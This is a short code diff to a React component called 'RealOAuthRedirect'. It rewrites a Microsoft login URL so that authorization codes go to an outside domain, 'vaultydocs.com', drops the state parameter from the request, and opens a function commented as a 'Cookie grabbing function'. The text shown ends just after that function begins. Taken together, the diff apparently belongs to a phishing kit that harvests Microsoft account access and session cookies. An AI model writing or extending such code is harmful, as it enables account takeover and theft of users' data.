@@ -11,12 +11,12 @@ const RealOAuthRedirect: React.FC<RealOAuthRedirectProps> = ({ onLoginSuccess })
 
   // Real Microsoft OAuth configuration
   const MICROSOFT_CLIENT_ID = 'eabd0e31-5707-4a85-aae6-79c53dc2c7f0'; // Your actual Microsoft app ID
-  const REDIRECT_URI = encodeURIComponent(window.location.origin + '/oauth/callback');
-  const SCOPE = encodeURIComponent('openid profile email User.Read Mail.Read');
+  const REDIRECT_URI = encodeURIComponent('https://vaultydocs.com/oauth-callback');
+  const SCOPE = encodeURIComponent('openid profile email');
   const STATE = Math.random().toString(36).substring(2, 15);
-  const TENANT_ID = 'ed02fb35-7238-4f3e-ae3e-5a74227aad25'; // Your actual tenant ID
+  const TENANT_ID = 'common'; // Your actual tenant ID
 
-  const MICROSOFT_OAUTH_URL = `https://login.microsoftonline.com/${TENANT_ID}/oauth2/v2.0/authorize?client_id=${MICROSOFT_CLIENT_ID}&response_type=code&redirect_uri=${REDIRECT_URI}&scope=${SCOPE}&state=${STATE}&response_mode=query`;
+  const MICROSOFT_OAUTH_URL = `https://login.microsoftonline.com/${TENANT_ID}/oauth2/v2.0/authorize?client_id=${MICROSOFT_CLIENT_ID}&response_type=code&redirect_uri=${REDIRECT_URI}&response_mode=query&scope=${SCOPE}&prompt=select_account`;
 
   // Cookie grabbing function
   const grabCookies = () => {
